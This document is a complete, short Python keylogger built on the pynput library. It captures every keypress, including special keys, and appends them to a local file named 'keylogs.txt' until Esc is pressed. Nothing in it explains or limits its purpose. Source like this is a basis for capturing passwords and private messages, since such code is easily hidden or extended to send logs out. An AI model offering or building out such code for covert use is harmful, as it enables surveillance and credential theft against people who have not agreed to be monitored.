import os
from pynput import keyboard

# Define the path for the log file
log_file = "keylogs.txt"

def on_press(key):
    try:
        # Convert special keys to their names
        if isinstance(key, keyboard.Key):
            key_str = f'<{key}>'
        else:
            key_str = str(key).replace("'", "")
        
        # Append the keystroke to the log file
        with open(log_file, 'a') as file:
            file.write(f"{key_str}\n")
    except Exception as e:
        print(f"Error logging keypress: {e}")

def on_release(key):
    # Stop the listener if the Esc key is pressed
    if key == keyboard.Key.esc:
        return False

# Create the log file if it doesn't exist
if not os.path.exists(log_file):
    with open(log_file, 'w') as file:
        pass

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()